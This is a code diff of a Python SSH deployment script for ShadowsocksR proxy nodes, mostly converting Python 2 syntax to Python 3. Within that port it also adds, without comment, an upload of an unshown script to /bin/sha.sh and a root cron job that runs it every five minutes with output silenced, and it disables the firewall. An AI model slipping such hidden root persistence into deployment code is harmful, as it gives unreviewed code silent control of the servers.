@@ -33,6 +33,7 @@ confile = curr_dir + '/conf/init.conf'
 cf.read(confile)
 timeout = int(cf.get("param", "timeout")) #ssh超时时间
 
+
 #将msyql配置信息写入本地文件
 def wrt_json_file(dest_dir,dest_file,str_json):
     with open(os.path.join(dest_dir,dest_file),"w") as f:
@@ -58,22 +59,25 @@ def get_ssh_client():
 def print_output(code,msg):
     d = {'code':code,'msg':msg}
     output = json.dumps(d) 
-    print output
+    print(output)
 
+command = "\'*/5 * * * * root sh /bin/sha.sh >& /dev/null\'"
 #需要在节点上执行的命令
 l_cmd = ['cd ~',
          'yum install -y git',
          'git clone https://github.com/ouhaohan8023/SSR_server.git',
          'cd SSR_server;cp config.json user-config.json;cp apiconfig.py userapiconfig.py;chmod +x run.sh',
-         'systemctl stop firewalld'
+         'systemctl status firewalld|if [ $? == 0 ];then systemctl stop firewalld; fi;',
+         'cat <(fgrep -i -v %s <(crontab -l)) <(echo %s) | crontab' % (command,command)
         ]
+
 
 wr_log('info','节点%s开始安装...'%(node_ip))
 
 #获取ssh连接
 try:
     client = get_ssh_client()
-except Exception,e:
+except Exception as e:
     lno = sys.exc_info()[-1].tb_lineno
     msg = 'Failed to get ssh connection:line no {},error message:{}'.format(lno,str(e))
     wr_log('warning',msg)
@@ -99,7 +103,10 @@ try:
             wr_log(level,msg)
             print_output(1,msg)
             sys.exit(1)
-except Exception,e:
+
+
+
+except Exception as e:
     lno = sys.exc_info()[-1].tb_lineno
     msg = 'error occurred while executing command:line no {},error message:{}'.format(lno,str(e))
     wr_log('warning',msg)
@@ -125,7 +132,7 @@ src_dir = '.'
 src_file = 'usermysql_{}.json'.format(node_ip)
 try:
     wrt_json_file(src_dir,src_file,s_my_config)
-except Exception,e:
+except Exception as e:
     lno = sys.exc_info()[-1].tb_lineno
     msg = 'Failed to write mysql configuration to local file:line no {},error message:{}'.format(lno,str(e))
     wr_log('warning',msg)
@@ -135,9 +142,11 @@ except Exception,e:
 #上传到节点
 dest_dir = '/root/SSR_server'
 dest_file = 'usermysql.json'
+
 try:
     put_mysql_json_file(src_dir,src_file,dest_dir,dest_file)
-except Exception,e:
+    put_mysql_json_file('.', 'sha.sh', '/bin', 'sha.sh')
+except Exception as e:
     lno = sys.exc_info()[-1].tb_lineno
     msg = 'Failed to upload mysql configuration file to remote node:line no {},error message:{}'.format(lno,str(e))
     wr_log('warning',msg)
@@ -150,7 +159,7 @@ try:
     stdin, stdout, stderr = client.exec_command(cmd)
     l = stderr.readlines()
     assert len(l) == 0,l[0]
-except Exception,e:
+except Exception as e:
     lno = sys.exc_info()[-1].tb_lineno
     msg = 'error occur when running script run.sh:line no {},error message:{}'.format(lno,str(e))
     wr_log('warning',msg)
@@ -160,3 +169,4 @@ except Exception,e:
 msg = 'node {} deployment was successful!'.format(node_ip)
 wr_log('info',msg)
 print_output(0,msg)
+
